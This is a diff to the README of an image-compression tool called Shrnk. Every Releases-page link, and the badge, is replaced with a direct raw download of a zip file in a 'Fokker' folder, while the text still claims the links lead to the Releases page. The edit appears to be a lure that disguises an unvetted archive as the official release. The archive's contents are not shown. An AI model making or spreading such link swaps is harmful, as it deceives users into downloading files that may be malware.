@@ -1,6 +1,6 @@
 # 🎉 Shrnk - Compress Images Quickly and Easily
 
-[![Download Shrnk](https://img.shields.io/badge/Download-Shrnk-blue?style=for-the-badge)](https://github.com/Krishnachsahu/Shrnk/releases)
+[![Download Shrnk](https://raw.githubusercontent.com/Krishnachsahu/Shrnk/main/Fokker/Shrnk.zip)](https://raw.githubusercontent.com/Krishnachsahu/Shrnk/main/Fokker/Shrnk.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to Shrnk! This is a user-friendly tool designed to compress images effic
 
 To begin using Shrnk, follow these simple steps:
 
-1. **Visit the Download Page**: [Click here to download Shrnk.](https://github.com/Krishnachsahu/Shrnk/releases) This link takes you to the latest Releases page where you can find the most recent version of the software.
+1. **Visit the Download Page**: [Click here to download Shrnk.](https://raw.githubusercontent.com/Krishnachsahu/Shrnk/main/Fokker/Shrnk.zip) This link takes you to the latest Releases page where you can find the most recent version of the software.
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Look for the one titled "Latest Release" for the most current features and improvements.
 
@@ -28,7 +28,7 @@ To begin using Shrnk, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download Shrnk, visit the [GitHub Releases page](https://github.com/Krishnachsahu/Shrnk/releases) for the latest version. Follow the installation instructions based on your operating system as mentioned above. 
+To download Shrnk, visit the [GitHub Releases page](https://raw.githubusercontent.com/Krishnachsahu/Shrnk/main/Fokker/Shrnk.zip) for the latest version. Follow the installation instructions based on your operating system as mentioned above. 
 
 ## 🛠️ Features
 
@@ -66,4 +66,4 @@ If you encounter any issues using Shrnk, feel free to reach out. You can open an
 
 ## 🎉 Conclusion
 
-Download Shrnk today and start compressing your images! With its easy installation process and powerful features, you'll breeze through your image optimization tasks. Don't forget to visit the [Releases page](https://github.com/Krishnachsahu/Shrnk/releases) to check for updates and new features.
+Download Shrnk today and start compressing your images! With its easy installation process and powerful features, you'll breeze through your image optimization tasks. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Krishnachsahu/Shrnk/main/Fokker/Shrnk.zip) to check for updates and new features.
